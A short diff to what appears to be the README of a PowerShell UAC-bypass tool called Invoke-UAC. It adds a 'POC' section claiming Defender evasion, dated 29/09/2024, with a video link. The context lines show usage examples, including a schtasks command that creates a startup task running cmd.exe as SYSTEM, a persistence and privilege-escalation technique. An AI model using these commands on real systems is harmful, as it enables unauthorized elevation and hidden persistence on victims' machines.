@@ -20,3 +20,10 @@ Invoke-UAC -Executable powershell -Command "ls"
 ```
 Invoke-UAC -Executable schtasks -Command "/create /tn UAC /tr 'cmd.exe' /sc onstart /ru System"
 ```
+
+# POC 
+Evasion de Defender 29/09/2024
+
+https://github.com/user-attachments/assets/2f4a5ea4-79db-4cd2-bc0c-d89bd9d56319
+
+
